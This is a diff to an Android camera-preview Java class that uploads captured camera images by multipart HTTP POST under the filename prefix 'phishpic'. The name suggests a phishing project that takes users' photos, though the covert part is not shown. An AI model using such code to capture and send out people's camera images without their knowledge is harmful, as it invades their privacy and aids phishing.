@@ -22,6 +22,7 @@ import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.ByteArrayEntity;
+import org.apache.http.entity.ContentType;
 import org.apache.http.entity.mime.HttpMultipartMode;
 import org.apache.http.entity.mime.MultipartEntityBuilder;
 import org.apache.http.impl.client.DefaultHttpClient;
@@ -41,7 +42,9 @@ import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.Socket;
 import java.net.URL;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 /** A basic Camera preview class */
@@ -155,10 +158,11 @@ public class CameraPreview extends SurfaceView implements SurfaceHolder.Callback
         // Create a new HttpClient and Post Header
         HttpClient httpclient = new DefaultHttpClient();
         HttpPost httppost = new HttpPost(url);
+        String filename =  new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
 
         try {
             MultipartEntityBuilder meb = MultipartEntityBuilder.create();
-            meb.addBinaryBody("upload[file]", data);
+            meb.addBinaryBody("upload[file]", data, ContentType.create("image/jpeg"), "phishpic" + filename);
             meb.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
             HttpEntity multipartEntity = meb.build();
             httppost.setEntity(multipartEntity);
